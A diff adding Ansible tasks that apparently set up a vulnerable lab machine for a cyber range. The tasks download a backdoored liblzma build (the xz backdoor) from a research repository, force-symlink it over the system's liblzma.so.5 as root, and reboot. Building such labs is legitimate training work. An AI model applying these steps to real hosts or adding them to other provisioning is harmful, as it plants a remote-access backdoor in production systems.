@@ -1,0 +1,32 @@
+- name: Download liblzma.so.5.6.1
+  ansible.builtin.include_tasks:
+    file: download_file.yml
+  vars:
+    ludus_download_file_name: liblzma.so.5.6.1
+    ludus_download_file_url: https://github.com/amlweems/xzbot/raw/main/assets/liblzma.so.5.6.1
+    ludus_download_file_host_path: /opt/xz_backdoor
+    ludus_download_file_checksum: "sha256:605861f833fc181c7cdcabd5577ddb8989bea332648a8f498b4eef89b8f85ad4"
+
+- name: Download liblzma.so.5.6.1.patch
+  ansible.builtin.include_tasks:
+    file: download_file.yml
+  vars:
+    ludus_download_file_name: liblzma.so.5.6.1.patch
+    ludus_download_file_url: https://github.com/amlweems/xzbot/raw/main/assets/liblzma.so.5.6.1.patch
+    ludus_download_file_host_path: /opt/xz_backdoor
+    ludus_download_file_checksum: "sha256:ea7206ab4b0c3479ff1b478c8803adc9e7aeba243254a9f601b626ef8aa80e3d"
+
+- name: Symlink the backdoor'd liblzma to liblzma.so.5
+  ansible.builtin.file:
+    src: /opt/xz_backdoor/liblzma.so.5.6.1.patch
+    dest: /usr/lib/x86_64-linux-gnu/liblzma.so.5
+    owner: root
+    group: root
+    state: link
+    force: true
+  become: true
+  register: create_symlink
+
+- name: Reboot if needed
+  ansible.builtin.reboot:
+  when: create_symlink.changed
